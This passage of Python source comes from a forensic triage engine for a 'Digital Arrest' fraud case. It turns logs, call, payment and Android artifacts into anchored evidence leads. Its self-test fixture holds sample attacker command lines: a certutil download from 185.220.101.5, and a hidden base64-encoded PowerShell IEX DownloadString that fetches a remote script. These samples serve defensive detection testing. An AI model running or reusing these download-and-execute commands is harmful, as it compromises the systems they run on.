                unavailable[aid] = "TRUNCATED"
                errors.append({"artifact_id": aid, "error": f"TRUNCATED: extent {a['base']}+{a['length']} ends "
                                                            f"beyond the file's {size} bytes"})
        for aid, a in sorted(self.artifacts.items()):
            if aid not in unavailable:
                by_kind[a["kind"]].append(aid)
        if self.sector_a is not None:
            self.sector_a["image_digest"] = self._verify_bound_image(errors)
        scanned = 0

        def guarded(aid: str, fn, *args):
            try:
                return fn(*args)
            except Exception as exc:  # one bad artifact must not abort the case
                errors.append({"artifact_id": aid, "error": f"{type(exc).__name__}: {exc}"[:300]})
                return None

        # --- Sector B.1: logs
        all_events: List[Dict[str, Any]] = []
        log_leads = []
        for aid in by_kind["process_events_jsonl"]:
            errs: List[str] = []
            evs = guarded(aid, lambda a: self.log_engine.parse_events_jsonl(self._load(a), errs), aid) or []
            scanned += len(evs)
            all_events.extend(evs)
            log_leads.extend(guarded(aid, self.log_engine.triage_events, evs, aid, self.lead_threshold, errs) or [])
            errors.extend({"artifact_id": aid, "error": e} for e in errs)

        anydesk_sessions = []
        ist_like = datetime.timezone(datetime.timedelta(minutes=self.log_utc_offset_minutes))
        for aid in by_kind["anydesk_trace"]:
            for s in guarded(aid, lambda a: self.media_engine.parse_anydesk_trace(self._load(a)), aid) or []:
                scanned += 1
                s["artifact_id"] = aid
                anydesk_sessions.append(s)
                if s["direction"] == "INCOMING":
                    try:
                        all_events.append({"event_id": "ANYDESK_INCOMING",
                                           "timestamp": parse_timestamp(s["timestamp_local"], ist_like)})
                    except (ValueError, OverflowError):
                        pass

        exculpatory = None
        top = None
        if log_leads:
            top = max(log_leads, key=lambda l: (l["score"], -l["ref"]["byte_offset"]))
            if top["event"].get("timestamp"):
                exculpatory = guarded(top["ref"]["artifact_id"], self.log_engine.section45_exculpatory_checklist,
                                      top["event"], all_events, self.device_owner)
                if exculpatory:   # absolute offset, like every lead anchor; lead id filled in after anchoring
                    t_aid = top["ref"]["artifact_id"]
                    exculpatory["evaluated_for_lead_id"] = None
                    exculpatory["evaluated_for_lead_artifact_id"] = t_aid
                    exculpatory["evaluated_for_lead_offset"] = self.artifacts[t_aid]["base"] + top["ref"]["byte_offset"]
        for l in log_leads:
            raw.append({"family": "LOG", "category": l["category"], "score": l["score"], "mitre": l["mitre"],
                        "details": dict(l["details"]), "ref": l["ref"], "s45_target": l is top})

        # --- Sector B.2: media / call artifacts
        requisitions_by_call: Dict[Optional[str], List[Dict[str, Any]]] = defaultdict(list)
        for aid in by_kind["whatsapp_log"]:
            data = guarded(aid, self._load, aid)
            if data is None:
                continue
            parsed = guarded(aid, self.media_engine.parse_whatsapp_log, data, self.log_utc_offset_minutes)
            if parsed is None:
                continue
            for e in parsed["errors"]:
                errors.append({"artifact_id": aid, "error": e})
            compressed = data[:2] == b"\x1f\x8b"
            scanned += len(parsed["candidates"])
            servers = []   # STUN/TURN lines: absolute anchors (or decompressed offsets for .gz), like candidates
            for sv in parsed["stun_turn_servers"]:
                entry = {"scheme": sv["scheme"], "host": sv["host"], "port": sv["port"], "artifact_id": aid}
                if compressed:
                    entry.update(decompressed_byte_offset=sv["byte_offset"], decompressed_length=sv["length"],
                                 decompressed_line_sha256=sv["line_sha256"])
                else:
                    try:
                        an = self._anchor(evidence_ref(aid, sv["byte_offset"], sv["length"]))
                        entry.update({k: an[k] for k in ("file_path", "offset_basis", "byte_offset", "length", "sha256")
                                      if k in an})
                    except (ValueError, OSError):
                        entry["line_offset_in_artifact"] = sv["byte_offset"]
                servers.append(entry)
            for c in self.media_engine.requisition_targets(parsed):
                req = guarded(aid, self.media_engine.build_sec94_requisition, self.case_id, c)
                if req is None:
                    continue
                requisitions_by_call[c.get("call_id")].append(req)
                if compressed:  # anchor the .gz as seized; locate the line inside the decompressed text
                    ref = evidence_ref(aid, 0, len(data), session_id=c.get("call_id"),
                                       decompressed_byte_offset=c["byte_offset"], decompressed_length=c["length"],
                                       decompressed_line_sha256=c["line_sha256"])
                else:
                    ref = evidence_ref(aid, c["byte_offset"], c["length"], session_id=c.get("call_id"))
                raw.append({"family": "MEDIA", "category": "WEBRTC_PEER_ENDPOINT", "score": 0.78, "mitre": None,
                            "details": {"candidate": {k: v for k, v in c.items()
                                                      if k not in ("byte_offset", "length", "line_sha256")},
                                        "stun_turn_servers": servers},
                            "ref": ref,
                            "statutory": {"bnss_sec_94_requisition_ready": req.get("query_window_utc") is not None,
                                          "target_ip": c["ip"], "cgnat_port": c["port"], "requisition": req}})
        for aid in by_kind["rppg_trace"]:
            tr = guarded(aid, lambda a: unpack_rppg_trace(self._load(a)), aid)
            if tr is None:
                continue
            scanned += len(tr["jaw_g"])
            res = guarded(aid, self.media_engine.analyze_rppg, tr["jaw_g"], tr["forehead_g"], tr["fps"], tr["jaw_r"])
            if res and res["threat_score"] >= self.lead_threshold:
                sid = tr["session_id"] or None
                statutory = None
                reqs = requisitions_by_call.get(sid) or []
                if reqs:
                    statutory = {"bnss_sec_94_requisition_ready": True, "target_ip": reqs[0]["target_public_ip"],
                                 "cgnat_port": reqs[0]["target_port"]}
                raw.append({"family": "MEDIA", "category": "DIGITAL_ARREST_DEEPFAKE", "score": res["threat_score"],
                            "mitre": None, "details": res,
                            "ref": evidence_ref(aid, 0, tr["length"], session_id=sid), "statutory": statutory})
        for aid in by_kind["image_pgm"]:
            img = guarded(aid, lambda a: parse_pgm(self._load(a), crop=self.media_engine.MAX_DCT_DIM), aid)
            if img is None:
                continue
            px, start = img
            scanned += 1
            res = guarded(aid, self.media_engine.analyze_spectrum, px, self.artifacts[aid]["meta"].get("qp"))
            if res and res["threat_score"] >= self.lead_threshold:
                raw.append({"family": "MEDIA", "category": "SYNTHETIC_IMAGE_SPECTRUM", "score": res["threat_score"],
                            "mitre": None, "details": res,
                            "ref": evidence_ref(aid, start, self.artifacts[aid]["length"] - start)})
        for aid in by_kind["registry_export"]:
            for h in guarded(aid, lambda a: self.media_engine.scan_registry_export(self._load(a)), aid) or []:
                scanned += 1
                raw.append({"family": "MEDIA", "category": "VIRTUAL_CAMERA_INJECTOR", "score": h["score"],
                            "mitre": None, "details": {k: v for k, v in h.items() if k not in ("byte_offset", "length")},
                            "ref": evidence_ref(aid, h["byte_offset"], h["length"])})
        for s in anydesk_sessions:
            if s["direction"] == "INCOMING":
                raw.append({"family": "MEDIA", "category": "REMOTE_ACCESS_SESSION", "score": 0.60,
                            "mitre": mitre_label("T1219"),
                            "details": {k: v for k, v in s.items() if k not in ("byte_offset", "length", "artifact_id")},
                            "ref": evidence_ref(s["artifact_id"], s["byte_offset"], s["length"])})

        # --- Sector B.3: financial
        def row_ref(r: Dict[str, Any]) -> Dict[str, Any]:
            return evidence_ref(r["_artifact"], r["_offset"], r["_length"], txn_id=r.get("txn_id") or r.get("tx_hash"))

        upi_rows: List[Dict[str, Any]] = []
        for aid in by_kind["upi_csv"]:
            errs: List[str] = []
            rows = guarded(aid, lambda a: self.fin_engine.parse_upi_csv(self._load(a), errs), aid) or []
            errors.extend({"artifact_id": aid, "error": e} for e in errs)
            for r in rows:
                r["_artifact"] = aid
            upi_rows.extend(rows)
            scanned += len(rows)
        for r in upi_rows:   # one row can never abort the case; a naive (zone-less) time is also tried as IST
            v = guarded(r["_artifact"], self.fin_engine.validate_rrn, r.get("rrn", ""), r["epoch"], bool(r.get("tz_naive")))
            if v is not None and not v["valid"]:
                raw.append({"family": "FIN", "category": "INVALID_NPCI_RRN", "score": 0.55, "mitre": None,
                            "details": {"transaction": _txn_view(r), "rrn_validation": v}, "ref": row_ref(r)})
        for alert in guarded("upi_csv", self.fin_engine.detect_smurfing, upi_rows) or []:
            rows = alert.pop("rows")
            notice = self.fin_engine.build_freeze_notice(self.case_id, alert)
            xml = self.fin_engine.build_fiu_str_xml(self.case_id, alert)
            xml_problems = str_xml_check(xml)
            raw.append({"family": "FIN", "category": "RAPID_UPI_SMURFING", "score": alert["threat_score"],
                        "mitre": None, "details": alert, "ref": row_ref(rows[0]),
                        "extra_refs": {"row_anchors": [row_ref(r) for r in rows]},
                        # B's notice is a gross-credit triage view; the freeze notice to serve is Sector D's
                        "statutory": {"bnss_sec_106_freeze_ready": False,
                                      "bnss_sec_106_freeze_notice_status": notice["notice_status"],
                                      "bnss_sec_106_fields_complete": notice["fields_complete"],
                                      "fiu_ind_str_xml_ready": not xml_problems,
                                      "fiu_ind_str_xml_problems": xml_problems,
                                      "flagged_mules": alert["flagged_mules"],
                                      "freeze_notice": notice, "fiu_ind_str_xml": xml}})
        chain_rows: List[Dict[str, Any]] = []
        for aid in by_kind["chain_csv"]:
            errs = []
            rows = guarded(aid, lambda a: self.fin_engine.parse_chain_csv(self._load(a), errs), aid) or []
            errors.extend({"artifact_id": aid, "error": e} for e in errs)
            for r in rows:
                r["_artifact"] = aid
            chain_rows.extend(rows)
            scanned += len(rows)
        for m in guarded("chain_csv", self.fin_engine.match_bridges, upi_rows, chain_rows) or []:
            u, c = m.pop("rows")
            raw.append({"family": "FIN", "category": "CROSS_CHAIN_BRIDGE", "score": m["threat_score"], "mitre": None,
                        "details": m, "ref": row_ref(u), "extra_refs": {"chain_anchor": row_ref(c)}})
        for aid in by_kind["chat_transcript"]:
            for tok in guarded(aid, lambda a: self.fin_engine.extract_hawala_tokens(self._load(a)), aid) or []:
                scanned += 1
                raw.append({"family": "FIN", "category": "MIRROR_HAWALA_TOKEN", "score": 0.70, "mitre": None,
                            "details": {k: v for k, v in tok.items() if k not in ("byte_offset", "length")},
                            "ref": evidence_ref(aid, tok["byte_offset"], tok["length"])})

        # --- Sector B.4: Android
        pkg_sources: List[Tuple[str, Dict[str, Dict[str, Any]], int]] = []
        secure: Dict[str, List[str]] = {"enabled_accessibility_services": [], "enabled_notification_listeners": []}
        usage: List[Tuple[str, Dict[str, Any], int]] = []
        for aid in by_kind["dumpsys_package"]:
            pk = guarded(aid, lambda a: self.apk_engine.parse_dumpsys_package(self._load(a)), aid)
            if pk is not None:
                pkg_sources.append((aid, pk, 0))
        for aid in by_kind["packages_xml"]:
            pk = guarded(aid, lambda a: self.apk_engine.parse_packages_xml(self._load(a)), aid)
            if pk is not None:
                pkg_sources.append((aid, pk, 0))
        for aid in by_kind["secure_settings"]:
            for k, v in (guarded(aid, lambda a: self.apk_engine.parse_secure_settings(self._load(a)), aid) or {}).items():
                secure[k].extend(v)
        for aid in by_kind["usagestats"]:
            usage.extend((aid, e, 0) for e in
                         guarded(aid, lambda a: self.apk_engine.parse_usagestats(self._load(a)), aid) or [])
        for aid in by_kind["bugreport"]:
            data = guarded(aid, self._load, aid)
            if data is None:
                continue
            if data[:4] == b"PK\x03\x04":
                errors.append({"artifact_id": aid, "error": "zipped bugreport: register the inner bugreport .txt "
                                                            "as the artifact so anchors point at its bytes"})
                continue
            split = guarded(aid, self.apk_engine.split_bugreport, data)
            if split is None:
                continue
            text, sections = split
            for name, (s, e) in sections.items():
                part = text[s:e]
                if name == "package":
                    pk = guarded(aid, self.apk_engine.parse_dumpsys_package, part)
                    if pk is not None:
                        pkg_sources.append((aid, pk, s))
                elif name == "usagestats":
                    usage.extend((aid, ev, s) for ev in guarded(aid, self.apk_engine.parse_usagestats, part) or [])
                elif name == "settings":
                    for k, v in (guarded(aid, self.apk_engine.parse_secure_settings, part) or {}).items():
                        secure[k].extend(v)
        suspicious, benign = set(), set()
        for aid, pkgs, base in pkg_sources:
            scanned += len(pkgs)
            scored = {p["package"]: p for p in self.apk_engine.score_packages(pkgs, secure)}
            for name in pkgs:
                p = scored.get(name)
                if p is None or p["threat_score"] < self.lead_threshold:
                    benign.add(name)
                    continue
                if {"SYSTEM_ALERT_WINDOW", "BIND_ACCESSIBILITY_SERVICE"} & set(p["dangerous_capabilities"]):
                    suspicious.add(name)
                raw.append({"family": "APK", "category": "ANDROID_TROJAN_CAPABILITY", "score": p["threat_score"],
                            "mitre": None, "details": {k: v for k, v in p.items() if k not in ("byte_offset", "length")},
                            "ref": evidence_ref(aid, base + p["byte_offset"], p["length"])})
        benign -= suspicious
        scanned += len(usage)
        for aid in sorted({u[0] for u in usage}):
            evs = sorted((dict(e, byte_offset=base + e["byte_offset"]) for a, e, base in usage if a == aid),
                         key=lambda e: (e["t"], e["byte_offset"]))
            for h in self.apk_engine.detect_overlay_attacks(evs, suspicious, benign):
                if h["threat_score"] < self.lead_threshold:
                    continue
                raw.append({"family": "APK", "category": "OVERLAY_HIJACK", "score": h["threat_score"], "mitre": None,
                            "details": {k: v for k, v in h.items() if k not in
                                        ("byte_offset", "length", "banking_event_offset", "banking_event_length")},
                            "ref": evidence_ref(aid, h["byte_offset"], h["length"]),
                            "extra_refs": {"banking_event_anchor": evidence_ref(
                                aid, h["banking_event_offset"], h["banking_event_length"])}})
        for aid in by_kind["apk"]:
            scanned += 1
            art = self.artifacts[aid]
            if art["data"] is not None:
                res = guarded(aid, self.apk_engine.analyze_apk_bytes, art["data"])
            else:
                res = guarded(aid, self.apk_engine.analyze_apk_file, art["path"], art["base"], art["length"])
            for f in (res or {}).get("findings", []):
                if f["weight"] >= self.lead_threshold:
                    raw.append({"family": "APK", "category": "POLYGLOT_APK", "score": f["weight"], "mitre": None,
                                "details": dict({k: v for k, v in f.items() if k not in ("byte_offset", "length")},
                                                file_threat_score=res["threat_score"]),
                                "ref": evidence_ref(aid, f["byte_offset"], f["length"])})

        # --- anchor and order (deterministic: family order, then evidence position)
        fam_order = {"LOG": 0, "MEDIA": 1, "FIN": 2, "APK": 3}
        raw.sort(key=lambda l: (fam_order[l["family"]], l["ref"]["artifact_id"], l["ref"]["byte_offset"], l["category"]))
        leads = []
        for l in raw:
            try:
                anchor = self._anchor(l["ref"])
                extras = {}
                for name, refs in (l.get("extra_refs") or {}).items():
                    extras[name] = [self._anchor(r) for r in refs] if isinstance(refs, list) else self._anchor(refs)
            except (ValueError, OSError) as exc:
                errors.append({"artifact_id": l["ref"]["artifact_id"], "error": f"lead not anchored: {exc}"})
                continue
            lead = {
                "lead_id": f"LEAD-B-{l['family']}-{len(leads) + 1:03d}",
                "threat_category": l["category"],
                "severity": severity_for(l["score"]),
                "threat_score": _r(l["score"]),
                "symbolic_anchor": anchor,
                "lead_details": dict(l["details"], **extras),
            }
            if l.get("mitre"):
                lead["mitre_technique"] = l["mitre"]
            if l.get("statutory"):
                lead["statutory_actions"] = l["statutory"]
            try:   # belt and braces: a value canonical JSON cannot carry drops this lead, not the manifest
                canonical_json(lead)
            except (ValueError, TypeError, UnicodeEncodeError, RecursionError) as exc:
                errors.append({"artifact_id": l["ref"]["artifact_id"],
                               "error": f"lead not serialisable: {type(exc).__name__}: {exc}"[:300]})
                continue
            if l.get("s45_target") and exculpatory:
                exculpatory["evaluated_for_lead_id"] = lead["lead_id"]
                exculpatory["evaluated_for_lead_offset"] = anchor["byte_offset"]
                exculpatory["evaluated_for_anchor"] = {k: anchor[k] for k in (
                    "artifact_id", "file_path", "offset_basis", "byte_offset", "length", "sha256") if k in anchor}
            leads.append(lead)
        if exculpatory:
            try:
                canonical_json(exculpatory)
            except (ValueError, TypeError, UnicodeEncodeError, RecursionError) as exc:
                errors.append({"artifact_id": exculpatory.get("evaluated_for_lead_artifact_id") or "",
                               "error": f"Section 45 checklist not serialisable: {type(exc).__name__}: {exc}"[:300]})
                exculpatory = None

        artifacts_out = []
        for aid, a in sorted(self.artifacts.items()):
            entry = {"artifact_id": aid, "kind": a["kind"], "source_type": a["source_type"],
                     "byte_offset": a["base"], "length": a["length"]}
            if a["path"] is not None:
                entry["file_path"] = a["meta"].get("display_path") or a["path"]
                entry["offset_basis"] = "ABSOLUTE_IN_FILE" if a["base"] or a["meta"].get("extent") else "FILE"
            else:
                entry["offset_basis"] = "ARTIFACT"
            status = unavailable.get(aid)
            sha = None
            if status is None:
                try:
                    sha = self._artifact_sha256(a)
                    status = "OK"
                except (OSError, ValueError) as exc:
                    status = "TRUNCATED" if isinstance(exc, ValueError) else "UNREADABLE"
                    errors.append({"artifact_id": aid, "error": f"{status}: artifact not hashed: {exc}"[:300]})
            entry.update(sha256=sha, status=status)
            artifacts_out.append(entry)

        ts = triage_time_utc or iso_utc(time.time())
        manifest: Dict[str, Any] = {
            "version": TRIAGE_VERSION,
            "case_id": self.case_id,
            "triage_timestamp_utc": ts,
            "admissibility_doctrine": ADMISSIBILITY_DOCTRINE,
            "sector_a_binding": self.sector_a,
            "summary_metrics": {
                "total_telemetry_events_scanned": scanned,
                "high_priority_leads_flagged": sum(1 for l in leads if l["severity"] in ("HIGH", "CRITICAL")),
                "total_leads": len(leads),
                "exculpatory_checks_evaluated": exculpatory["checks_evaluated"] if exculpatory else 0,
                "trojan_defense_probability": exculpatory["trojan_defense_probability"] if exculpatory else None,
            },
            "artifacts": artifacts_out,
            "artifact_errors": errors,
            "symbolic_anchors": leads,
            "section45_exculpatory_checklist": exculpatory,
            "engine_runtime": {"revision": TRIAGE_REVISION, "python": sys.version.split()[0], "numpy": _np is not None,
                               "onnxruntime": _ort is not None,
                               "neural_prefilter_attached": self.media_engine.onnx_session is not None,
                               "sector_a_module": getattr(_sector_a, "VAULT_VERSION", None),
                               # device-local offset used for WhatsApp/AnyDesk times, so Sector C can refuse
                               # to re-interpret local strings with a different zone
                               "log_utc_offset_minutes": self.log_utc_offset_minutes},
        }
        manifest["manifest_sha256"] = _sha256_hex(canonical_json(manifest))
        self._cache = {}
        if write:
            os.makedirs(self.output_dir, exist_ok=True)
            path = os.path.join(self.output_dir, MANIFEST_FILENAME)
            with open(path, "w", encoding="utf-8") as f:
                json.dump(manifest, f, indent=2, sort_keys=True, ensure_ascii=False, allow_nan=False)
                f.write("\n")
        return manifest


def validate_manifest(m: Dict[str, Any]) -> List[str]:
    """
    Schema check for triage_manifest.json; returns a list of problems (empty when valid). Never raises:
    a tampered manifest with wrong types (null lead, string score, NaN, dict instead of list) is
    reported as problems, so Sector C says "failed validation" instead of showing a traceback.
    """
    try:
        return _validate_manifest(m)
    except Exception as exc:  # pragma: no cover - last resort; _validate_manifest type-checks everything
        return [f"manifest malformed: {type(exc).__name__}: {exc}"[:300]]


def _validate_manifest(m: Any) -> List[str]:
    if not isinstance(m, dict):
        return ["manifest is not a JSON object"]
    errs = []
    for k in ("version", "case_id", "triage_timestamp_utc", "summary_metrics", "symbolic_anchors", "manifest_sha256"):
        if k not in m:
            errs.append(f"missing {k}")
    if errs:
        return errs
    if m["version"] != TRIAGE_VERSION:
        errs.append("version mismatch")
    if not (isinstance(m["triage_timestamp_utc"], str)
            and re.fullmatch(r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z", m["triage_timestamp_utc"])):
        errs.append("triage_timestamp_utc not ISO-8601 UTC with milliseconds")
    sm = m["summary_metrics"]
    if not isinstance(sm, dict):
        errs.append("summary_metrics is not an object")
    else:
        for k in ("total_telemetry_events_scanned", "high_priority_leads_flagged", "exculpatory_checks_evaluated",
                  "trojan_defense_probability"):
            if k not in sm:
                errs.append(f"summary_metrics.{k} missing")
    leads = m["symbolic_anchors"]
    if not isinstance(leads, list):
        errs.append("symbolic_anchors is not a list")
        leads = []
    ids = set()
    for n, lead in enumerate(leads):
        if not isinstance(lead, dict):
            errs.append(f"symbolic_anchors[{n}] is not an object")
            continue
        lid = lead.get("lead_id", "")
        if not isinstance(lid, str) or not re.fullmatch(r"LEAD-B-(LOG|MEDIA|FIN|APK)-\d{3}", lid) or lid in ids:
            errs.append(f"bad lead_id {lid!r}")
        if isinstance(lid, str):
            ids.add(lid)
        for k in ("threat_category", "severity", "threat_score", "symbolic_anchor", "lead_details"):
            if k not in lead:
                errs.append(f"{lid}: missing {k}")
        a = lead.get("symbolic_anchor", {})
        if not (isinstance(a, dict) and isinstance(a.get("byte_offset"), int) and not isinstance(a["byte_offset"], bool)
                and a["byte_offset"] >= 0 and isinstance(a.get("length"), int) and not isinstance(a["length"], bool)
                and a["length"] > 0 and re.fullmatch(r"[0-9a-f]{64}", str(a.get("sha256"))) and a.get("source_type")):
            errs.append(f"{lid}: incomplete symbolic anchor")
        score = lead.get("threat_score", 0)
        if isinstance(score, bool) or not isinstance(score, (int, float)) or not math.isfinite(score):
            errs.append(f"{lid}: bad threat_score {score!r}"[:120])
        elif lead.get("severity") != severity_for(score):
            errs.append(f"{lid}: severity inconsistent with score")
    body = {k: v for k, v in m.items() if k != "manifest_sha256"}
    try:
        digest = _sha256_hex(canonical_json(body))
    except (ValueError, TypeError, UnicodeEncodeError, RecursionError):
        errs.append("manifest not canonical-JSON serialisable")
    else:
        if digest != m["manifest_sha256"]:
            errs.append("manifest_sha256 does not match content")
    return errs


# --------------------------------------------------------------------------- #
# Synthetic evidence for the self-test                                        #
# --------------------------------------------------------------------------- #

def _ps_enc(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


def _synthetic_rppg(delay_s: float, fps: float = 30.0, seconds: float = 12.0, hr_hz: float = 1.2,
                    harmonic: float = 0.5, seed: int = 7) -> Tuple[List[float], List[float], List[float]]:
    rng = random.Random(seed)
    n = int(fps * seconds)

    def pulse(t: float) -> float:
        return math.sin(2 * math.pi * hr_hz * t) + harmonic * math.sin(2 * math.pi * 2 * hr_hz * t + 0.7)

    jaw = [100 + pulse(i / fps) + 0.02 * rng.uniform(-1, 1) for i in range(n)]
    fore = [90 + pulse(i / fps - delay_s) + 0.02 * rng.uniform(-1, 1) for i in range(n)]
    red = [140 + 0.4 * pulse(i / fps) + 0.01 * rng.uniform(-1, 1) for i in range(n)]
    return jaw, fore, red


def _synthetic_image(checker: float = 0.0, n: int = 32, seed: int = 3) -> List[List[float]]:
    """1/f natural texture synthesised in the DCT domain, plus an optional upsampler checkerboard."""
    rng = random.Random(seed)
    coef = [[0.0] * n for _ in range(n)]
    for u in range(n):
        for v in range(n):
            if u or v:
                coef[u][v] = rng.gauss(0, 1) * 600.0 / math.hypot(u, v)
    img = idct2(coef)
    return [[128 + img[y][x] + checker * (1 if (x + y) % 2 else -1) for x in range(n)] for y in range(n)]


def _synthetic_apk(prefix: bytes = b"", trailer: bytes = b"") -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
        zf.writestr("AndroidManifest.xml", b"<manifest package='com.challan.update'/>")
        zf.writestr("classes.dex", b"dex\n035\x00" + bytes(64))
    return prefix + buf.getvalue() + trailer


def _build_case_bundle() -> Dict[str, bytes]:
    """Every artifact of the synthetic 'Digital Arrest' case, as raw bytes."""
    ev = []
    t = "2026-10-14T06:10:{:02d}.000Z"
    ev.append({"event_id": 4624, "timestamp": "2026-10-14T05:58:00.000Z", "logon_type": 2, "user": "rahul",
               "host": "VICTIM-PC"})
    ev.append({"event_id": 1, "timestamp": t.format(1), "image": "C:\\Windows\\explorer.exe",
               "command_line": "\"C:\\Windows\\explorer.exe\" C:\\Users\\rahul\\Documents",
               "parent_image": "C:\\Windows\\System32\\userinit.exe", "user": "rahul", "logon_type": 2})
    ev.append({"event_id": 1, "timestamp": t.format(5), "image": "C:\\Windows\\System32\\certutil.exe",
               "command_line": "certutil.exe -urlcache -split -f http://185.220.101.5/a.exe C:\\Users\\Public\\a.exe",
               "parent_image": "C:\\Windows\\System32\\cmd.exe", "user": "rahul", "logon_type": 2})
    ev.append({"event_id": 1, "timestamp": t.format(9), "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
               "command_line": "powershell.exe -NoP -W Hidden -enc " + _ps_enc(
                   "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/s.ps1')"),
               "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
               "user": "rahul", "logon_type": 2})
    events = "\n".join(json.dumps(e, sort_keys=True) for e in ev).encode() + b"\n"

    wa = (
        "2026-10-14 11:40:02.118 LL_I voip/call: call-id=wrtc_call_99182 offer video=1 peer=+91XXXXXX\n"
        "2026-10-14 11:40:02.230 LL_I voip/ice: stun server stun:stun.whatsapp.net:3478 turn:turn.e2ee.whatsapp.net:3478\n"
        "2026-10-14 11:40:02.410 LL_I voip/ice: local candidate: candidate:1 1 udp 2122260223 192.168.1.5 50123 typ host generation 0\n"
        "2026-10-14 11:40:02.912 LL_I voip/ice: remote candidate: candidate:842163049 1 udp 1677729535 185.220.101.5 3478 typ srflx raddr 10.12.0.4 rport 50998 generation 0\n"
        "2026-10-14 11:40:03.004 LL_I voip/ice: remote candidate: candidate:9 1 udp 41885439 157.240.16.50 3478 typ relay raddr 185.220.101.5 rport 3478\n"
    ).encode()

    jaw, fore, red = _synthetic_rppg(0.0)
    rppg = pack_rppg_trace(30.0, jaw, fore, red, session_id="wrtc_call_99182")

    reg = (
        "Windows Registry Editor Version 5.00\r\n\r\n"
        "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{860BB310-5D01-11d0-BD3B-00A0C911CE86}\\Instance\\"
        "{A3FCE0F5-3493-419F-958A-ABA1250EC20B}]\r\n"
        "\"FriendlyName\"=\"OBS Virtual Camera\"\r\n"
        "\"CLSID\"=\"{A3FCE0F5-3493-419F-958A-ABA1250EC20B}\"\r\n\r\n"
        "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{860BB310-5D01-11d0-BD3B-00A0C911CE86}\\Instance\\"
        "{17CCA71B-ECD7-11D0-B908-00A0C9223196}]\r\n"
        "\"FriendlyName\"=\"Integrated Webcam\"\r\n"
    )
    registry = b"\xff\xfe" + reg.encode("utf-16-le")

    anydesk = (
        "Incoming    2026-10-14, 11:31    User      482193765    482193765\n"
        "Outgoing    2026-10-13, 20:02    Passwd    731904218    731904218\n"
    ).encode()

    upi = (
        "txn_id,rrn,timestamp_utc,payer_vpa,payee_vpa,amount_inr,payee_ifsc\n"
        "T1,628711000101,2026-10-14T06:15:00.000Z,rahul@okhdfc,hub.kyc@ybl,250000.00,YESB0000001\n"
        "T2,628711000102,2026-10-14T06:15:20.000Z,hub.kyc@ybl,mule1@ybl,62000.00,YESB0000101\n"
        "T3,628711000103,2026-10-14T06:15:41.000Z,hub.kyc@ybl,mule2@paytm,61500.00,PYTM0123456\n"
        "T4,628711000104,2026-10-14T06:16:02.000Z,hub.kyc@ybl,mule3@okaxis,60000.00,UTIB0000123\n"
        "T5,628711000105,2026-10-14T06:16:20.000Z,hub.kyc@ybl,mule4@ibl,61500.00,INDB0000456\n"
        "T6,628711000106,2026-10-14T06:20:00.000Z,mule2@paytm,p2p.trader@ybl,59000.00,YESB0000202\n"
        "T7,628740000107,2026-10-14T06:21:00.000Z,mule3@okaxis,cash.drop@ibl,1500.00,INDB0000789\n"
    ).encode()
    chain = (
        "tx_hash,chain,timestamp_utc,from_address,to_address,amount_usdt\n"
        "0x7f3c1e,TRON,2026-10-14T06:22:00.000Z,TQ5p2pDeskWallet,TXmuleExitWallet,665.20\n"
    ).encode()
    chat = ("[14/10/26 12:05] Handler: cash pickup at Sadar Bazar, show note 34K 712946 to the runner\n"
            "[14/10/26 12:06] Runner: ok, will confirm with 12A1234567 later\n").encode()

    dumpsys = (
        "Packages:\n"
        "  Package [com.challan.update] (5f2c0a1):\n"
        "    userId=10234\n"
        "    codePath=/data/app/~~kQ==/com.challan.update-1\n"
        "    firstInstallTime=2026-10-13 21:04:11\n"
        "    installerPackageName=null\n"
        "    requested permissions:\n"
        "      android.permission.BIND_ACCESSIBILITY_SERVICE\n"
        "      android.permission.SYSTEM_ALERT_WINDOW\n"
        "      android.permission.RECEIVE_BOOT_COMPLETED\n"
        "  Package [com.sms.otp.helper] (8a11b2c):\n"
        "    userId=10235\n"
        "    codePath=/data/app/~~zX==/com.sms.otp.helper-1\n"
        "    installerPackageName=com.google.android.packageinstaller\n"
        "    requested permissions:\n"
        "      android.permission.BIND_NOTIFICATION_LISTENER_SERVICE\n"
        "  Package [com.whatsapp] (11aa22b):\n"
        "    codePath=/data/app/~~aa==/com.whatsapp-1\n"
        "    installerPackageName=com.android.vending\n"
        "    requested permissions:\n"
        "      android.permission.RECORD_AUDIO\n"
    )
    settings = "enabled_accessibility_services=com.challan.update/com.challan.update.SyncService\n"
    usagestats = (
        'time="2026-10-14 11:52:10.100" type=MOVE_TO_FOREGROUND package=com.sbi.lotusintouch class=.Login\n'
        'time="2026-10-14 11:52:10.300" type=MOVE_TO_FOREGROUND package=com.challan.update class=.OverlayActivity\n'
        'time="2026-10-14 11:58:00.000" type=MOVE_TO_FOREGROUND package=com.whatsapp class=.Main\n'
    )
    bugreport = ("== dumpstate: 2026-10-14 12:30:00\n"
                 "------ DUMP OF SERVICE package:\n" + dumpsys +
                 "------ DUMP OF SERVICE settings:\n" + settings +
                 "------ DUMP OF SERVICE usagestats:\n" + usagestats).encode()
    apk = _synthetic_apk(prefix=b"\xff\xd8\xff\xe0" + bytes(60) + b"\xff\xd9",
                         trailer=b"dex\n035\x00" + bytes(120))
    return {"events": events, "whatsapp": wa, "rppg": rppg, "registry": registry, "anydesk": anydesk,
            "upi": upi, "chain": chain, "chat": chat, "bugreport": bugreport, "apk": apk}


# --------------------------------------------------------------------------- #
# Self-test                                                                   #
# --------------------------------------------------------------------------- #

def _audit_regressions(workdir: str) -> List[Tuple[str, bool]]:
    """One check per finding of the 2026-10-20 adversarial audit (A-01 .. E-01, 22 findings)."""
    out: List[Tuple[str, bool]] = []

    def check(name: str, ok: Any, detail: str = "") -> None:
        ok = bool(ok)
        out.append((name, ok))
        print(f"  [{'PASS' if ok else 'FAIL'}] R{len(out):02d} {name}" + (f"  ({detail})" if detail else ""))

    log, media, fin, apk = LogTriageEngine(), DeepfakeTriageEngine(), FinancialMuleDetector(), AndroidTrojanTriageEngine()
    print("\nAudit regressions")

    # A-01 packages.xml: one anchor per <package> element
    xml = (b'<?xml version="1.0"?>\n<packages>\n'
